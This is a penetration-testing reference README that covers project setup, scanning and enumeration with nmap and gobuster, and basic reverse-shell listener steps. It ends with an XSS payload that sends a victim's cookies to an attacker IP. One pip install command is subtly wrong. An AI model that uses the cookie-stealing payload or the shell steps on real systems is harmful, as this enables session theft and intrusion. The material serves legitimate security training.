# REDREF

A red teaming reference for attacking boxes. Thie repository contains notes, comands and tips for penetration testing. Notes are arranged according to the [MITRE ATT&CK framework](https://attack.mitre.org/), which also aligns nicely with the way Kali Linux is structured.



## Setup
```
[myproject]
    |
    |__ [myproject].md      <-- stores the summary notes
    |__ requirements.txt    <-- python libraries used within this project
    |__ variables.sh        <-- contains variables for the target environment
    |__ .gitignore          <-- use to tell git to ignore certain files/filetypes if using version control
    |__ .venv               <-- folder for python interpreter specific to this project
```

When starting a new project it is handy to create a folder structure similar to above the on the local filesystem (replace `[myproject]` with the name of the project). This folder will store all scripts and outputs specific to the project.

More details on this are below.

### Create the notes file
Markdown (.md) format is very useful for capturing code related notes. Creating a `[myproject.md]` in the project root folder provides a ready reference for the process, theories, commands, dead ends, findings etc specific to the project.


### Set variables
It is very useful to set shell variables that can be reused multiple times. Most of the commands in this repository rely on these variables being set. When recommencing work on a project just `source variables.sh`.

```
target_ip='10.10.10.10'
user='john'
pass='password123'
domain='mydomain'
```    

### Python virutal environments
When crafting payloads or exploits or running custom cracking tools it is often useful to use Python. The best way of doing this is to create a virtual environment within the project folder.
- Install venv: `sudo apt install python3-venv`
- Create a new virtual environment called .venv in the current directory `python -m venv .venv`
- Activate the environment `source .venv/bin/activate`
- Create a text file with python libraries required for the project (one library per line). By convention this is called `requirements.txt`.
- Install required packages listed in requriements.txt `pip install requirements.txt`



## General process

### Getting started.

- **Host and Port Scanning**: First step is usually to run nmap to find out what ports and services are open. Use a range of scans. At least a broad scan to identify open ports, then use service and script enumeration to obtain further details.



## Super useful reference sites:

1. [WADComs](https://wadcoms.github.io/): An interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.


## TO DO
The following sections need to find a home.

### Directory enumeration
Set variables: `target_url="target_url"`
- Gobuster: `gobuster dir -u $target_url -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | tee gobuster_dir.txt`

### VHost
gobuster vhost -v -u https://abrictosecurity.com -w /usr/share/wordlists/subdomains/top5000subdomains -o vhostlist.txt

### Sniffing & Spoofing
Show connected and listening sockets `netstat -an` (-n shows numberical port)


## Exploitation

### Reverse shells
- Create a listener using netcat `nc -lvvp [port]`
- Spawn a bash shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`

### Web Server Listener
- Start a simple python web server to listen for connections: `python -m http.server 5000`'



## XSS Payloads
- Img: `<script>var i=new Image(); i.src="http://10.10.14.41:5000/?cookie="+btoa(document.cookie); </script>`